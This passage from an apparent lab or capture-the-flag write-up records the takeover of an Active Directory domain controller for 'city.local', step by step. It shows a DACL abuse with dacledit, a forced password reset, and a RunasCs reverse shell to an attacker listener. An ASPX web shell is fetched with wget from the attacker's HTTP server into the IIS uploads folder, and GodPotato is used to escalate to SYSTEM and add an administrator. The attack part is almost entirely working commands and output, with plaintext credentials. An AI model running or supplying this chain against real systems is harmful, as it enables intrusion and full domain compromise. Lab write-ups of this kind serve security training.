modifying rdn of entry "CN=Web Admin,OU=Quarantine,DC=city,DC=local"
```
Now the user webadmin should be part of the cityops OU which means i should have writeDACL  over webadmin so now i can apply GenericAll

```python
dacledit.py -action 'write' -rights 'FullControl' -principal 'emma.hayes' -target 'web_admin' 'city.local'/'emma.hayes':'!Gemma4James!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260307-160109.bak
[*] DACL modified successfully!
```
This has given `emma.hayes` GenericAll over the `web_admin`

```python
net rpc password "web_admin" "Ethan-hacked-you69" -U "city.local"/"emma.hayes"%'!Gemma4James!' -S "DC-CC.city.local"
```
This should have changed the password for the web admin

```python
nxc ldap DC-CC.city.local -u web_admin -p 'Ethan-hacked-you69'                                            
LDAP        10.0.24.231     389    DC-CC            [*] Windows 10 / Server 2019 Build 17763 (name:DC-CC) (domain:city.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.24.231     389    DC-CC            [+] city.local\web_admin:Ethan-hacked-you69
```
This user is now compromised

# Domain admin
```python
*Evil-WinRM* PS C:\Temp> upload RunasCs.exe
                                        
Info: Uploading /home/kali/hsm/CityCouncil/RunasCs.exe to C:\Temp\RunasCs.exe
                                           
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```
This uploaded RunasCs.exe to the target 

```python
*Evil-WinRM* PS C:\Temp> ./RunasCs.exe web_admin Ethan-hacked-you69 'whoami /priv'
[*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more privileged token.


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
*Evil-WinRM* PS C:\Temp> 
```
This exe allows me to run commands as other users in this case the web_admin
## Penelope reverse shell
```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.200.38.216
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
This started a listener on my machine

```python
*Evil-WinRM* PS C:\Temp> ./RunasCs.exe web_admin Ethan-hacked-you69 cmd.exe -r 10.200.38.216:1337
[*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-145d989$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5876 created in background.
```
This forced a connection back to me for the web_admin

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.200.38.216
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] • DC-CC 10.0.24.231 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 city\web_admin • Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/DC-CC~10.0.24.231-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_03_07-17_41_57-734.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
city\web_admin
```
Now ive got a shell as the web admin
Im going to try and upload a shell to uploads directory in the webroot
## Access as IIS
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
I used the shell here and hosted it on my machine
```python
python3 -m http.server 4444                                                        
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

```python
PS C:\inetpub\wwwroot\uploads> wget http://10.200.38.216:4444/shell.aspx -o shell.aspx
wget http://10.200.38.216:4444/shell.aspx -o shell.aspx
```
This transferred the file now i can navigate to it on the website

```python
penelope -p 1337           
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.200.38.216
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] • DC-CC 10.0.24.231 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 iis apppool\defaultapppool • Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/DC-CC~10.0.24.231-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_03_07-18_06_34-206.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>
```
After navigating to it i get a shell as this new user

```python
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Ill transfer GodPotato to the target using a python web server

## Domain admin
```python
PS C:\Temp> ./GodPotato-NET4.exe -cmd 'net localgroup Administrators sam.brooks /add'
./GodPotato-NET4.exe -cmd 'net localgroup Administrators sam.brooks /add'
[*] CombaseModule: 0x140706970861568
[*] DispatchTable: 0x140706973163584
[*] UseProtseqFunction: 0x140706972541072
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\7eec69e7-dd07-4f79-a269-de813e92084d\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00006402-0d48-ffff-307a-f602ec5b1cba
[*] DCOM obj OXID: 0x13d78798af8967ad
[*] DCOM obj OID: 0xb49da46e3f033b4f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 920 Token:0x644  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2204
The command completed successfully.
```
This command used godpotato and added the user `sam.brooks` to the administrators group

```python
evil-winrm -i DC-CC.city.local -u sam.brooks -p Ethan-hacked-you69
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sam.brooks\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\sam.brooks\Documents> 
```
Domain admin!
